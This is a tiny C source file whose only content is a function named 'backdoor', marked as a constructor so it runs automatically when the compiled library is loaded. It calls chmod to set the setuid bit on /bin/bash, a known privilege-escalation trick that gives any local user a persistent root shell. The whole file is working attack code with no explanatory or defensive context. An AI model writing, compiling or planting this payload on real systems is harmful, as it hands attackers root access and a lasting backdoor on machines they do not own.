#include <unistd.h>
#include <sys/stat.h>

__attribute__((constructor)) 
void backdoor() {
    chmod("/bin/bash", 04755);
}
